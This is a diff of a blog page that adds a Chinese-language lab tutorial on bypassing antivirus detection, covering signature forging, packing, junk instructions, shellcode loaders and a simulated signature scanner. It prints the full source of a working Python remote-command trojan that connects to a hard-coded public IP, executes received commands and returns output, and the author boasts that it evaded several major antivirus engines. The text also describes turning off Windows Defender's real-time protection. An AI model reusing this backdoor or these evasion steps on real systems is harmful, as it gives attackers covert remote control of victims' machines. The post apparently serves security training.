@@ -6,15 +6,77 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2021 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="病毒检测绕过  【目的】让学员通过该实验的练习主要掌握：·基本的病毒分类及其制作方法·病毒特征及检测方法·病毒检测的绕过方法 【环境】&amp;emsp;&amp;emsp;操作机：kali，靶机：win10 【工具】&amp;emsp;&amp;emsp;python3，php7，netcat，msf，x64dbg，SigThief， donut，burpsuite ，中国蚁剑 【原理】·检测技术 &amp;emsp;&amp;emsp;签名">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2021/page/8/index.html">
+<meta property="og:url" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="病毒检测绕过  【目的】让学员通过该实验的练习主要掌握：·基本的病毒分类及其制作方法·病毒特征及检测方法·病毒检测的绕过方法 【环境】&amp;emsp;&amp;emsp;操作机：kali，靶机：win10 【工具】&amp;emsp;&amp;emsp;python3，php7，netcat，msf，x64dbg，SigThief， donut，burpsuite ，中国蚁剑 【原理】·检测技术 &amp;emsp;&amp;emsp;签名">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/2.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/virustotal.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/virustotal.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/h2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/h1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/6.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.6.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/6.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/6.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/6.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/7.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/7.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/7.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/8.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/8.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/8.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/8.3.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.3.1.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.5.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/10.2.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/3.4.PNG">
+<meta property="og:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/9.5.PNG">
+<meta property="article:published_time" content="2021-09-26T02:17:52.676Z">
+<meta property="article:modified_time" content="2021-09-22T04:39:24.165Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/img/1.1.PNG">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -162,328 +224,242 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-病毒检测绕过" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <center>病毒检测绕过</center>
+
+<h2 id="【目的】"><a href="#【目的】" class="headerlink" title="【目的】"></a>【目的】</h2><p>让学员通过该实验的练习主要掌握：<br>·基本的病毒分类及其制作方法<br>·病毒特征及检测方法<br>·病毒检测的绕过方法</p>
+<h2 id="【环境】"><a href="#【环境】" class="headerlink" title="【环境】"></a>【环境】</h2><p>&emsp;&emsp;操作机：kali，靶机：win10</p>
+<h2 id="【工具】"><a href="#【工具】" class="headerlink" title="【工具】"></a>【工具】</h2><p>&emsp;&emsp;python3，php7，netcat，msf，x64dbg，SigThief， donut，burpsuite ，中国蚁剑</p>
+<h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>·检测技术</p>
+<p>&emsp;&emsp;签名检测技术：PE文件数字签名是Authenticode数字签名格式，用于验证二进制程序的来源和完整性。<br>&emsp;&emsp;基于PKCS #7公开密钥加密标准签名数据，并使用X.509证书关联二进制文件和发布者。<br>&emsp;&emsp;在PE文件数据目录表中，存储着签名信息偏移地址和大小。<br>&emsp;&emsp;签名的验证可以使用Wintrust.lib库中的WinVerifyTrust函数实现。<br>&emsp;&emsp;其中验证包括签名是否存在以及签名是否有效。<br>&emsp;&emsp;签名存在只需要验证签名是否为\x00，签名有效通过hash值判断</p>
+<p>&emsp;&emsp;特征码扫描技术：其基本机制为将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。<br>&emsp;&emsp;杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码。<br>&emsp;&emsp;在病毒样本中，抽取特征代码，抽取的代码比较特殊，不大可能与普通正常程序代码吻合。<br>&emsp;&emsp;抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。</p>
+<p>·免杀技术<br>&emsp;&emsp;签名绕过：签名伪造的方式有两种，一种是在文件尾部添加伪造的签名数据，也就是本实验所用到的方法，但是并不能绕过hash值验证。另一种方法是修改系统签名获取机制。这种方法需要劫持dll难度较大。<br>&emsp;&emsp;加壳免杀：软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。<br>&emsp;&emsp;花指令免杀：花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。<br>&emsp;&emsp;拆分PE文件：在特征码扫描中，为了保证不误杀，往往会提取同一个PE文件的多个特征码进行匹配，只有一个文件同时拥有这些特征码时才会被判定为木马文件，那么就可以利用将一个PE文件拆分成多个文件，分别上传来防止被检测。<br>&emsp;&emsp;加载器编写：shellcode由于可以随意地进行变化和还原，杀软的查杀难度较大。因此将木马shellcode化，再进行shellcode免杀是目前最流行的免杀方式之一。shellcode是一种地址无关代码，只要给他EIP就能够开始运行。shellcode已经有了，但是还需要获得运行权限，而加载器就是为了顺利运行shellcode。<br>&emsp;&emsp;二分PE：对于PE文件类型来说，并不能提取shellcode。相对于shellcode的没有地址标记，bin文件也是如此，所以我们用bin文件代替PE文件。同样的我们也需要一个加载器运行bin文件<br>&emsp;&emsp;混淆免杀：通过一定规律的编码算法，将对metaspolit、CS生成的shellcode进行编码/模糊处理/变形，从原始shellcode中删除所有无效的字符，从而逃避杀毒软件检测。<br>&emsp;&emsp;垃圾字符：有些老式的主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。所以可以通过构造大文件来绕过。</p>
+<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="1-安装及配置环境"><a href="#1-安装及配置环境" class="headerlink" title="1.安装及配置环境"></a>1.安装及配置环境</h3><h4 id="1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。"><a href="#1-1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为-2021。" class="headerlink" title="1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。"></a>1.1获取qcow2文件，转为vmdk，用vmware打开vmdk文件，运行。开机PIN码为 2021。</h4><p><img src="img/1.1.PNG"></p>
+<h4 id="1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"><a href="#1-2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。" class="headerlink" title="1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。"></a>1.2打开虚拟机设置，在“网络适配器”中选择“桥连模式”。</h4><p><img src="img/1.2.PNG"></p>
+<h4 id="1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"><a href="#1-3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。" class="headerlink" title="1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。"></a>1.3等待虚拟机配置网络，如果弹出如下弹窗，选择“是”。</h4><p><img src="img/1.3.PNG"></p>
+<h4 id="1-4检查windows-defender"><a href="#1-4检查windows-defender" class="headerlink" title="1.4检查windows defender"></a>1.4检查windows defender</h4><p>&emsp;&emsp;实验中发现windows defender的自动检测功能可能会在开机后以及待机恢复后自动开启。为了防止干扰试验，请先检查windows配置，方法为“设置”——“windows安全中心”——“病毒和威胁防护”——“病毒和威胁防护”设置下的“管理设置”，将“实时防护”改为“关”。<br><img src="img/1.4.PNG"></p>
+<h4 id="1-5开启apache"><a href="#1-5开启apache" class="headerlink" title="1.5开启apache"></a>1.5开启apache</h4><p>&emsp;&emsp;点击桌面上的phpstudy，将“Apache2.4.39”启动<br><img src="img/1.5.PNG"></p>
+<h4 id="1-6本实验的环境拓扑如下图"><a href="#1-6本实验的环境拓扑如下图" class="headerlink" title="1.6本实验的环境拓扑如下图"></a>1.6本实验的环境拓扑如下图</h4><p><img src="img/1.6.PNG"><br>准备一台kali操作机一台Win10靶机和一个外网centos操作机来搭建实验环境（因为家用ip一般都会变动，所以用服务器，来避免每次实验都重写木马的外网ip），kali的内网ip为192.168.43.86，监听4444端口，windows10靶机的内网ip为192.168.43.106，centos操作机的外网ip为110.40.245.122，监听9999端口<br>实验上传文件备份于靶机右侧的文件夹中，内含“帮助文档”来介绍文件的用途</p>
+<h3 id="2-签名验证绕过实验"><a href="#2-签名验证绕过实验" class="headerlink" title="2.签名验证绕过实验"></a>2.签名验证绕过实验</h3><h4 id="2-1利用msf生成exe木马"><a href="#2-1利用msf生成exe木马" class="headerlink" title="2.1利用msf生成exe木马"></a>2.1利用msf生成exe木马</h4><p><img src="img/2.1.PNG"></p>
+<h4 id="2-2尝试上传"><a href="#2-2尝试上传" class="headerlink" title="2.2尝试上传"></a>2.2尝试上传</h4><p><img src="img/2.2.PNG"></p>
+<h4 id="2-3查看结果"><a href="#2-3查看结果" class="headerlink" title="2.3查看结果"></a>2.3查看结果</h4><p>&emsp;&emsp;并没有我们上传的文件，说明被删除。<br><img src="img/2.3.PNG"></p>
+<h4 id="2-4为木马添加签名"><a href="#2-4为木马添加签名" class="headerlink" title="2.4为木马添加签名"></a>2.4为木马添加签名</h4><p><img src="img/2.4.PNG"></p>
+<h4 id="2-5再次上传"><a href="#2-5再次上传" class="headerlink" title="2.5再次上传"></a>2.5再次上传</h4><p><img src="img/2.5.PNG"></p>
+<h4 id="2-6验证结果"><a href="#2-6验证结果" class="headerlink" title="2.6验证结果"></a>2.6验证结果</h4><p><img src="img/2.6.PNG"></p>
+<h3 id="3-加壳绕过实验"><a href="#3-加壳绕过实验" class="headerlink" title="3.加壳绕过实验"></a>3.加壳绕过实验</h3><h4 id="3-1开启模拟病毒检测脚本"><a href="#3-1开启模拟病毒检测脚本" class="headerlink" title="3.1开启模拟病毒检测脚本"></a>3.1开启模拟病毒检测脚本</h4><p><img src="img/3.1.PNG"><br>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>&emsp;&emsp;检测脚本代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">print(&quot;开始检测&quot;)</span><br><span class="line">while(1):</span><br><span class="line"></span><br><span class="line">    # 获取目标文件夹的路径</span><br><span class="line">    filedir &#x3D; os.getcwd()</span><br><span class="line">    # 获取当前文件夹中的文件名称列表</span><br><span class="line">    filenames &#x3D; os.listdir(filedir)</span><br><span class="line">    for filename in filenames:</span><br><span class="line">        if (filename!&#x3D;&#39;test.py&#39; and filename!&#x3D;&#39;upload_file.php&#39; and filename!&#x3D;&#39;index.html&#39; and filename!&#x3D;&#39;nginx.htaccess&#39; and filename!&#x3D;&#39;.htaccess&#39;):</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            a &#x3D; e.read(6997712)</span><br><span class="line">            e.close()</span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            b &#x3D; e.read(2048)</span><br><span class="line">            e.close()</span><br><span class="line">            #print(b)</span><br><span class="line">            sear &#x3D; re.search(rb&#39;\x65\x2e\x68\x13\xda\x69\xf9\x54\xea\xc1\xbc\x42\x11\xa6\x8a\xf9\xfc\x4b\xe5\x52\x71\xc1\xcd\x13\x32\xe5\x8c\x93\x93\x87\x79\xc7\x85\x8b\x89\x98\x7c\x69\xa6\xe5\xe7\x41\x0f\x8b\x24\x40\x89\xc3\xad&#39;,a)</span><br><span class="line">            sear1 &#x3D;re.search(rb&#39;\x48\x89\x5c\x24\x08\x57\x48\x83\xec\x20\x8b\xf9\xe8\x37\xab\x00\x00\x48\x8b\x18\xe8\x27\xab\x00\x00\x48\x8b\xd3\x8b\x08\xe8\x9d\x53\x00\x00\x48\x8b\xd0\x8b\xcf\x48\x8b\x5c\x24\x30\x48\x83\xc4\x20\x5f\xe9\xd9\x17\x00\x00\xcc&#39;,b)</span><br><span class="line"></span><br><span class="line">            e &#x3D; open(filename, &#39;rb&#39;)</span><br><span class="line">            c&#x3D;e.read()</span><br><span class="line">            e.close()</span><br><span class="line">            sear2 &#x3D; re.search(rb&#39;\xF6\x8B\xEC\x81\x0B\x0C\x04\x00\x00\xB8\xD7\x02\x4F\x00\x4E\x56\xA3\xE8\x17\x41\x00\xA3\xA8\x0B\x41\x00\xA3\x44\xD7\x47\x00\xA3\xC7\xB1\x41\x00\x33\xDB\x88\x48\xFB\x41\x00\x57\x8D\x45\xE1\x53\x8D\x4D\x08\x50\x51\xC7\x05\xF0\x17\x41\x00\x44\xD2\x40\x00\x88\x1D\x18\x3C\x41\x00\xE8\xD6\x4C\x00\x00\x68\xE0\x5F\x40\x9E\x2B\xD8\xA4\x00\x00\x83\xC4\x04\xCC\x53\x53\x68\x42\x40\x41\x00\xE8\x3D\x3E\x00\x15\x8B\x55\x0C\x8B\x45\x08&#39;,c)</span><br><span class="line"></span><br><span class="line">            #print(sear)</span><br><span class="line">            #print(sear1)</span><br><span class="line">            #print(filename)</span><br><span class="line">            if (((sear !&#x3D; None) and (sear1 !&#x3D;None)) or sear2 !&#x3D;None):</span><br><span class="line">                print(&quot;已删除文件&quot;+filename)</span><br><span class="line">                os.remove(filename)</span><br><span class="line">            else:</span><br><span class="line">                if(re.search(&#39;.exe&#39;,filename)):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    #val&#x3D;os.popen(filename)</span><br><span class="line">                if(filename&#x3D;&#x3D;&#39;peloader.py&#39;):</span><br><span class="line">                    print(&quot;开始运行程序&quot;)</span><br><span class="line">                    val&#x3D;os.popen(&quot;python &quot;+filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    time.sleep(10)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>此脚本主要模拟了“特征码检测”的方法，为了确定特征码的有效性，提取地点为程序的text节，为了防止误报，部分程序提取了两个部分的特征码。才用每十秒检测一次的形式，如果被检测出病毒，脚本会自动删除文件；如果检测为“安全”，脚本会模拟人为操作“运行文件”。然后我上传了一个没有病毒的main.exe文件，并未被检测出来，并成功运行。<br><img src="img/virustotal.PNG"></p>
+<h4 id="3-2在操作机上上访问-http-192-168-43-106-8082"><a href="#3-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="3.2在操作机上上访问 http://192.168.43.106:8082/"></a>3.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4><p><img src="img/3.2.PNG"></p>
+<h4 id="3-3在操作机上传client1-exe文件"><a href="#3-3在操作机上传client1-exe文件" class="headerlink" title="3.3在操作机上传client1.exe文件"></a>3.3在操作机上传client1.exe文件</h4><p><img src="img/3.3.PNG"><br>&emsp;&emsp;client1.exe是由python脚本用pyinstaller转化而来的远程rce木马，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># 文件名：client.py</span><br><span class="line"></span><br><span class="line"># 导入 socket、sys 模块</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 创建 socket 对象</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"># 获取本地主机名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置端口号</span><br><span class="line">port &#x3D; 9999</span><br><span class="line"></span><br><span class="line"># 连接服务，指定主机和端口</span><br><span class="line">s.connect((&quot;110.40.245.122&quot;, port))</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    # 接收小于 1024 字节的数据</span><br><span class="line">    msg &#x3D; s.recv(1024)</span><br><span class="line">    val&#x3D;os.popen(msg.decode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #print (msg.decode(&#39;utf-8&#39;))</span><br><span class="line">    #print(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    #val&#x3D;str(val)</span><br><span class="line">    #print(type(val))</span><br><span class="line">    for temp in val.readlines():</span><br><span class="line">        #print(temp)</span><br><span class="line">        s.send(temp.encode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(msg&#x3D;&#x3D;&#39;exit&#39;):</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
+<p>这个脚本的作用是远程RCE，即运行后向固定ip（操作机，因为家用机的ip会改变，所以我使用了服务器）发送连接请求，连接成功后接收对方的字符串并以指令方式执行，然后回传给操作机。<br>下图为病毒在virustotal的检测情况，可以看到本身绕过了360，腾讯，火绒，Microsoft等比较出名的杀毒检测。从这里我们可以得出：自己写的病毒很难被检测，现行的杀毒软件大部分还是针对市面上比较常见的病毒生成器和造成大规模伤害的病毒。<br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e">https://www.virustotal.com/gui/file/d1e1ef77e50b85dc38ec1c0af18f669a6f832866f00bceed94b0cd8b78e2a46e</a><br><img src="img/virustotal.PNG"></p>
+<h4 id="3-4靶机脚本检测出木马，删除此文件"><a href="#3-4靶机脚本检测出木马，删除此文件" class="headerlink" title="3.4靶机脚本检测出木马，删除此文件"></a>3.4靶机脚本检测出木马，删除此文件</h4><p><img src="img/3.4.PNG"></p>
